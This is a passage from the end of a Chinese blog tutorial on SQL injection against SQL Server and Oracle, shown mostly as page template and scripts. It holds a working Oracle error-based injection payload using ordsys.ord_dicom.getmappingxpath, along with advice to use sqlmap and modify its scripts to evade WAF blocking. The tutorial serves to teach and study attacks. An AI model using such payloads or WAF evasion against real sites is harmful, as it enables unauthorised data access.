+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ordsys.ord_dicom.getmappingxpath((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual),<span class="hljs-keyword">user</span>,<span class="hljs-keyword">user</span>)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>decode()进行报错注入</strong></p>
+<p>这种方式更偏向布尔盲注，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。</p>
+<h4 id="其它方式-1"><a href="#其它方式-1" class="headerlink" title="其它方式"></a>其它方式</h4><p>sqlmap一把梭，或者超级SQL注入工具。如果遇到waf拦截，则需要修改sqlmap的脚本。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>脚本小子yyds！</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">#SQL注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SQL注入（三）--SQL server和Oracle注入</div>
+      <div>https://rookieterry.github.io/2021/10/05/SQL注入（三）-SQL-server和Oracle注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>HackerTerry</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>星期二, 十月 5日 2021, 5:54 下午</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/06/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%9B%9B%EF%BC%89-WAF%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/" title="SQL注入（四）--WAF绕过思路">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SQL注入（四）--WAF绕过思路</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/05/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89-Access%E6%B3%A8%E5%85%A5/" title="SQL注入（二）--Access注入">
+                        <span class="hidden-mobile">SQL注入（二）--Access注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.7/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://twikoo-82xld20xt-rookieterry.vercel.app/","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+              Fluid.plugins.imageCaption(imgSelector);
+              Fluid.plugins.fancyBox(imgSelector);
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
